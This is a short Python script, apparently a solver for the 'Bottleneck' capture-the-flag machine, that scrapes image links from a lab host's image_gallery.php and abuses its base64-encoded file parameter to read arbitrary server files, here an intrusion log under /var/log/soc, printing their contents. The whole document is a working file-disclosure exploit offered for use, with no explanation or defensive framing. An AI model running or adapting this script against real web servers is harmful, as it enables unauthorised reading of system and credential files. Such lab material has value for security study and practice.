##This script should help you solve Bottleneck, nothing else to tell, no spoilers
##image_gallery.php?t=1578829354&f=Ym90dGxlbmVja19kb250YmUucG5n

import requests
from bs4 import BeautifulSoup
import re
import base64


fajl = input("File: ")
encodirano = base64.b64encode(fajl.encode("utf-8"))
encStr = str(encodirano, "utf-8")

url = "http://192.168.1.102/image_gallery.php"
izvor = requests.get(url).text
soup=BeautifulSoup(izvor, "lxml")

for link in soup.find_all("img"):
	vrednosti = link.get("src")
	#new_req = requests.get("http://192.168.1.102/"+vrednosti[0:33]+encStr)
	vreme = "/var/log/soc/intrusion_"+vrednosti[20:30]
	enc1 =base64.b64encode(vreme.encode("utf-8"))
	en1 = str(enc1,"utf-8")
	new_req = requests.get("http://192.168.1.102/"+vrednosti[0:33]+en1)
	print(new_req.text)

